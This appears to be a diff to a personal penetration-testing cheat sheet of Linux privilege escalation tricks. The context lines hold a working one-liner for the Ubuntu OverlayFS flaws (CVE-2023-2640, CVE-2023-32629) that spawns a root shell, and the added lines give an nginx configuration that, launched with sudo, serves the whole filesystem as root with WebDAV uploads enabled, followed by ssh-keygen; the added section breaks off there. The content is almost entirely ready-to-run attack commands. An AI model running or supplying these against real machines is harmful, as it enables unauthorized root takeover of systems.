@@ -132,3 +132,31 @@ Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629):
 #ubuntu overlayfs priv esc from reddit
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
 ```
+
+NGINX sudo:
+create the following /tmp/pwn.conf on box:
+```conf
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+        worker_connections 768;
+}
+http {
+        server {
+                listen 1337;
+                root /;
+                autoindex on;
+                dav_methods PUT;
+     }
+}
+```
+```bash
+sudo nginx -c /tmp/pwn.conf
+ss -tunlp
+#make sure port 1337 is opened
+ssh-keygen
+
+```
+
+
